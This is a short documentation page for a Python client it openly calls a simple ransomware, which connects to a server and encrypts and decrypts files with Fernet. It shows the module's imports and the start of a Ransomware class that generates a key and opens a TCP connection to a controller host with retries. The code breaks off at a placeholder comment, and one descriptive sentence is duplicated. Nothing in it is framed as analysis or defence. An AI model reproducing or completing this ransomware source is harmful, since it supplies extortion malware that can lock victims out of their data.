.. _client-documentation:

Client Documentation
====================

This Python module implements a simple ransomware that connects to a server, encrypts files, and decrypts them using the Fernet encryption algorithm.

1. **Import the necessary modules**:

.. code-block:: python

   from time import sleep
   from modules.system import System
   from modules.encdec import Fernet, Encrypt, Decrypt
   from socket import socket, AF_INET, SOCK_STREAM
.
- This Python module implements a simple ransomware that connects to a server, encrypts files, and decrypts them using the Fernet encryption algorithm.

2. **Class Ransomware**:

.. code-block:: python

    class Ransomware:
        def __init__(self, host: str, port: int) -> None:
            self.key = Fernet.generate_key()
            self.host = host
            self.port = port
            self.system: System = System()
            self.server: socket = socket(AF_INET, SOCK_STREAM)
            self.Private = Fernet(self.key)

        def ConnectServer(self, connected=False) -> None:
            retries = 0
            while not connected and retries < 3:
                try:
                    self.server.connect((self.host, self.port))
                    # Rest of your implementation here...
